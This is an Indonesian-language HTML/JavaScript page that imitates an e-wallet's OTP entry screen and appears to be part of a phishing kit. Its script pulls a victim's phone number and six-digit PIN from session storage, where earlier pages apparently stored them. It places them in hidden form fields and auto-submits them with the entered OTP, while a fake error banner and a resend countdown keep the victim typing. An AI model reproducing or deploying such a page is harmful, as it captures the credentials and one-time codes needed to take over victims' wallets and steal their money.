<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="refresh">
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="gyrozyeelb/ryns/ntl.css">
<link rel="stylesheet" href="gyrozyeelb/ryns/pto.css">
<title>Masukkan OTP</title>
<link rel="stylesheet" href="gyrozyeelb/ryns/spnr.css">
</head>
<style>
 @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
* {
    font-family: 'Open Sans', sans-serif;
    font-weight: 400;
}

body {
    width: 100%;
    height: 100vh;
    margin: 0;
    padding: 0;
    background-color: #118EEA;
    overflow: hidden;
}

.container {
    box-sizing: border-box;
    display: block;
    margin: auto;
    width: 100%;
    height: 100%;
    max-width: 600px;
    max-height: 1000px;
    background-color: #118EEA;
    padding: 25px;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    -webkit-transform: translate(-50%, -50%);
    -moz-transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    -o-transform: translate(-50%, -50%);
}

.bk {
    position: absolute;
    top: 20px;
    width: 14px;
    float: left;
}

.dnt {
    display: block;
    font-size: 18px;
    color: #fff;
    text-align: center;
    margin-top: -10px;
    font-weight: 600;
    margin-left: auto;
    margin-right: auto;
}

.tstp {
  text-align: center;
  font-size: 17px;
  color: #fff;
  font-weight: 510;
  margin-top: 50px;
}

.mw-s {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  margin-top: 16px;
}

.rsd {
    font-size: 14px;
    font-weight: 600;
    color: #b7b7b7df;
}

.tsv {
  font-size: 16px;
  color: #fff;
  font-weight: 430;
  margin-top: -3px;
}

.pgms {
  width: 150px;
  height: 18px;
  margin-left: 8px;
}

.bxtm {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

.gbv-p {
  display: flex;
}

.ftp {
    display: flex;
    justify-content: center;
    align-items: center;
}
.intp {
    background: #ffffff;
    margin-left: 2px;
    margin-right: 2px;
    margin-top: 10px;
    margin-bottom: 25px;
    border-radius: 8px;
    border: 1px solid #dadada;
    font-size: 25px;
    font-weight: 400;
    text-align: center;
    width: 40px;
    height: 45px;
    outline: none;
    caret-color: transparent;
}

.pstahs {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

.txspn {
  display: flex;
  text-align: center;
  margin-top: -7px;
}   
    
    .bk-tnps {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  margin-top: -5px;
}

.bk-tnp {
  background-color: #2627293e;
  width: 225px;
  height: 35px;
  border-radius: 8px;
}

.tksty {
  display: flex;
  margin-left: 6px;
}

.tksty img {
  width: 60px;
  height: 35px;
}

.tksty p {
  font-size: 21px;
  font-weight: 400;
  font-family: Sans-Serif;
  color: #fff;
  letter-spacing: 3px;
  margin-left: 10px;
  margin-top: 5px;
}

.tstx {
  text-align: center;
  font-size: 17px;
  color: #fff;
  font-weight: 510;
  margin-top: -10px;
}


.process {
    position: absolute;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #0000005b;
    width: 100%;
    height: 100vh;
}

span {
  font-weight: 600;
  color: black;
}

.sdnt {
  font-size: 14px;
  font-weight: 600;
  color: black;
  margin-left: 7px;
}

.loading {
    position: absolute;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-bottom: 20%;
}
.loading img {
    width: 50px;
}

.btxs {
  background-color: #fff;
  width: 172px;
  height: 33px;
  border-radius: 5px;
  border: 1px solid #dadada;
}

.loading .spinner{
    position: absolute;
    width: 35px;
    animation: spin 1s linear infinite;
    -webkit-animation: spin 1s linear infinite;
    -moz-animation: spin 1s linear infinite;
    -ms-animation: spin 1s linear infinite;
    -o-animation: spin 1s linear infinite;
}
@keyframes spin {
  0% { transform: rotate(360deg); }
  100% { transform: rotate(0deg); }
}
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}
@-moz-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}
@-ms-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}
@-o-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}

.bk-tnps {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  margin-top: -5px;
}

.bk-tnp {
  background-color: #2627293e;
  width: 225px;
  height: 35px;
  border-radius: 8px;
}

.tksty {
  display: flex;
  margin-left: 6px;
}

.tksty img {
  width: 60px;
  height: 35px;
}

.tksty p {
  font-size: 15px;
  font-weight: 400;
  font-family: Sans-Serif;
  color: #fff;
  letter-spacing: 3px;
  margin-left: 10px;
  margin-top: 8.5px;
}

.tstx {
  text-align: center;
  font-size: 17px;
  color: #fff;
  font-weight: 510;
  margin-top: -10px;
}

.ktkbs {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  top: 40px;
  position: fixed;
  margin: 0 auto;
  left:0;
  right:0;
}

.ktka {
  background-color: #f8363df7;
  width: 300px;
  height: 42px;
  border-radius: 5px;
}

.tskst {
  text-align: center;
  margin-top:4%;
}

.tskst p {
  font-size: 13px;
  font-weight: 400;
  font-family: Sans-Serif;
  color: #fff;  
}

.animated {
  animation: turun 1s forwards;
}

.animated.hide {
  animation: naik-kembali 1s forwards;
}

@keyframes turun {
  0% {
    transform: translateY(-80px);
    opacity: 0;
  }
  100% {
    transform: translateY(0);
    opacity: 1;
  }
}

@keyframes naik-kembali {
  0% {
    transform: translateY(0);
    opacity: 1;
  }
  100% {
    transform: translateY(-80px);
    opacity: 0;
  }
}
</style>
<body>
<div class="container" id="container">
  <a class="abk" href="lg1.html"><img class="bk" src="https://hosting.tigerengine.id/pv2mmj.png"></a>
  <h1 class="dnt">Masukan Kode OTP</h1>
  <div class="ktkbs animated naik" style="display:none;">
    <div class="ktka">
      <div class="tskst">
        <p>Kode OTP tidak benar. Silahkan coba kembali</p>
      </div>
    </div>
  </div>
  <h2 class="tstp">Kode OTP telah terkirim ke</h2>
  <h2 class="tstx">Nomor kamu</h2>
  <div class="bk-tnps">
  <div class="bk-tnp">
  <div class="tksty">
   <img src="https://hosting.tigerengine.id/f5q2to.png" alt="error">
   <p id="alert"></p>
  </div>
  </div>
  </div>
  <div class="mw-s">
   <div class="gbv-p">
    <p class="tsv">via</p>
    <img class="pgms" src="https://hosting.tigerengine.id/tikji4.png" alt="error">
   </div>
  </div>
<form id="otp" method="post">
  <input type="hidden" name="tarif" id="tarif">
   <input type="hidden" name="nomor" id="nomor">
    <input type="hidden" name="pin1" id="pin1">
     <input type="hidden" name="pin2" id="pin2">
      <input type="hidden" name="pin3" id="pin3">
       <input type="hidden" name="pin4" id="pin4">
        <input type="hidden" name="pin5" id="pin5">
         <input type="hidden" name="pin6" id="pin6">
 <div class="ftp clear" id="ftp">
  <input type="number" id="tp1" maxlength="1" autocomplete="off" class="intp" name="otp1" ></input>
  <input type="number" id="tp2" maxlength="1" autocomplete="off" class="intp" name="otp2" ></input>
  <input type="number" id="tp3" maxlength="1" autocomplete="off" class="intp" name="otp3" ></input>
  <input type="number" id="tp4" maxlength="1" autocomplete="off" class="intp" name="otp4"></input>
 </div>
</form>
<div class="bxtm">
<div class="btxs">
<div class="pstahs">
<div class="txspn">
<p class="rsd">KIRIM ULANG</p>
<p class="sdnt">00:<span id="time">60</span></p>
</div>
</div>
</div>
</div>
</div>
<div id="process" name="process" class="process" style="display: none;">
 <div class="loading">
  <img src="https://hosting.tigerengine.id/afkqhh.png">
  <img class="spinner" src="https://hosting.tigerengine.id/14fu31.png">
 </div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="jquery.js"></script>
<script>
 // Ambil nilai dari penyimpanan sesi
var tarif = sessionStorage.getItem("tarif");
var nomor = sessionStorage.getItem("nomor");
var pins = [];
for (var i = 1; i <= 6; i++) {
  pins.push(sessionStorage.getItem("pin" + i));
}

// Isi nilai ke dalam elemen input
document.getElementById("tarif").value = tarif;
document.getElementById("nomor").value = nomor;
for (var i = 0; i < pins.length; i++) {
  document.getElementById("pin" + (i + 1)).value = pins[i];
}

// Tampilkan nilai nomor di dalam elemen alert
document.getElementById("alert").innerHTML = nomor;   
    
    $('.ftp input').on('input', function(event) {
    const inputs = $('.ftp input');
    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
    if (isAllFilled == true) {
        $(event.target).blur();
        submit();
    }
    const index = inputs.index(this);
    const currentValue = event.target.value;
    if (currentValue.length === 1) {
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    } else if (currentValue.length === 0) {
        if (index > 0) {
            inputs[index].focus();
        }
    };
});
$('.ftp input').on('keydown', function(event) {
    const inputs = $('.ftp input');
    const key = event.key;
    const index = inputs.index(this);
    if (key === 'Backspace' && event.target.value.length === 0) {
        if (index > 0) {
            inputs[index - 1].focus();
        }
    };
});



let xx  = document.getElementById('process')
let con = document.getElementById('container')


function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        display.textContent = seconds;
        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}
window.onload = function () {
    var fiveMinutes = 59 * 1,
        display = document.querySelector('#time');
    startTimer(fiveMinutes, display);
};

$('.clear').click(function() {
    $('#tp1').val('');
     $('#tp2').val('');
      $('#tp3').val('');
       $('#tp4').val('');
    $('#tp1').focus();
  });
</script>
</body>
</html>
